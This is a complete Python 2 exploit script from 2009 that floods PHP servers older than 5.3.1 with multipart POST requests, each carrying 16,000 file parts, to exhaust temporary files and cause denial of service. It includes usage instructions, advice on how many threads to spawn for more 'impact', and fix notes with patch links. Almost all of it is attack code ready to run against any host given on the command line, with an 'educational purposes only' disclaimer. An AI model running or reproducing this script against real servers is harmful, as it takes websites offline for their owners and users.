#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author:
#     Eren Turkay <eren .-. pardus.org.tr>, 2009/11/20
#     http://www.pardus.org.tr/eng/
#
# Credits:
#     Bogdan Calin from Acunetix
#
# Description:
#     Exploit to cause denial of service on any host that runs PHP via temporary
#     file exhaustion. It doesn't matter whether the script handles uploads or not.
#     If host runs PHP, it is enough to cause DoS using any PHP script it serves.
#
#     This is the implementation of disclosed vulnerability that was found
#     by Bogdan Calin. See: http://www.acunetix.com/blog/websecuritynews/php-multipartform-data-denial-of-service/
#
# Affected versions:
#     All PHP versions before PHP 5.3.1 and unpatched 5.2.11
#
# Platforms:
#     Windows, Linux, Mac
#
# Fix:
#     Update to 5.3.1. If you use 5.2.11 and can't update, apply the patch [0]:
#
#     [0] http://svn.php.net/viewvc/php/php-src/branches/PHP_5_2/main/rfc1867.c?r1=272374&r2=289990&view=patch (introduce max_file_upload)
#     [0] http://svn.php.net/viewvc/php/php-src/branches/PHP_5_2/main/main.c?r1=289214&r2=289990&view=patch (NOTE: upstream changed 100 to 20, do it so)
#
# Usage:
#     python php-multipart-dos.py <site> <port> </index.php> <num of child: optional>
#
#     After opening childs, you may wait long for threads to finish because sending such a huge data is painful.
#     However, it's not important to finish the request. Openining lots of connections and sending huge data fastly will enough to cause DoS.
#     So the more threads you spawn, the more impact you will make. In normal cases, spawning 150 childs would be enough. But the number depends on you.
#     Trial and error ;))
#
# Example:
#     python php-multipart-dos.py www.example.com 8080 /index.php
#
#     By defalt, the program will create 100 threads, each thread will send 10 requests.
#     You can specify child number to create, you may want to increase or decrease for the impact, etc..
#
#     python php-multipart-dos.py www.example.com 80 /~user/index.php 50
#
# Notes:
#     This script is for educational purposes only. Use it at your OWN risk!

import socket
import random
import time
import threading
import sys

class Connection:
    def __init__(self, host, port):
        self._host = host
        self._port = port
        self.sock = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self._host, self._port))

    def send(self, msg):
        if not self.sock:
            raise "NotConnected"
        else:
            self.sock.send(msg)

    def close(self):
        self.sock.close()

class Exploit (threading.Thread):
    def __init__(self, host, port, target):
        self._host = host
        self._port = port
        self._target = target
        threading.Thread.__init__(self)

    def getBoundary(self):
        """ Return random boundary data """
        random.seed()
        rnd = random.randrange(100000, 100000000)
        data = "---------------------------%s" % rnd
        return data

    def createPayload(self):
        data = """POST %(target)s HTTP/1.1\r
Host: %(host)s\r
Uset-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)\r
Connection: keep-alive\r
Content-Type: multipart/form-data; boundary=%(boundary)s\r
Content-Length: %(length)s\r\n\r\n"""

        boundary = self.getBoundary()

        # Create a number of upload data, 16.000, yeah! :)
        for i in range(16000):
            data += "--%s\r\n" % boundary
            data += """Content-Disposition: form-data; name="file_%s"; filename="file_%s.txt"\r
Content-Type: text/plain\r\n
Lorem ipsum dolor sit amet, consectetur adipiscing elit. In non blandit augue.\n\r\n""" % (i, i)

        data += "--%s--\r\n" % boundary

        return data % {"host": self._host, "target": self._target, "boundary": boundary, "length": str(len(data))}

    def run(self):
        payload = self.createPayload()
        for i in range(0, 10):
            c = Connection(self._host, self._port)
            c.connect()
            c.send(payload)
            c.close()
            sys.exit(0)
        del payload
        sys.exit(0)

def usage():
    usage_data = """
 __^__                                                  __^__
( ___ )------------------------------------------------( ___ )
 | / |                                                  | \ |
 | / | Eren Turkay <eren .-. pardus.org.tr>, 2009/11/20 | \ |
 | / | http://www.pardus.org.tr/eng/                    | \ |
 |___|                                                  |___|
(_____)------------------------------------------------(_____)

PHP denial of service exploit via temporary file exhaustion
Usage: python php-multipart-dos.py <host> <port> </adress/index.php> <child number: optional>

See source code for more information
"""

    print usage_data

if __name__ == '__main__':
    if not len(sys.argv) >= 4:
        usage()
    else:
        # is child number passed?
        if len(sys.argv) >= 5:
            child = int(sys.argv[4])
        else:
            child = 100
        print "[+] Attack started..."
        for i in range(0, child):
            try:
                exp = Exploit(str(sys.argv[1]), int(sys.argv[2]), str(sys.argv[3]))
                exp.start()
                print "[+] Opening %s childs... [%s]\r" % (child, i+1),
                sys.stdout.flush()
                i += 1
            except KeyboardInterrupt:
                print "\n[-] Keyboard Interrupt. Exiting..."
                sys.exit(1)

        # print it so that previous "Opening childs..." is still there
        print ""
        while True:
            try:
                activeChilds = threading.activeCount()
                print "[+] Waiting for childs to finish. %d remaining...\r" % activeChilds,
                sys.stdout.flush()
                # we have one main process
                if activeChilds == 1:
                    print "\nOK!"
                    sys.exit(0)
            except KeyboardInterrupt:
                print "\n[-] Exiting without waiting!"
                sys.exit(1)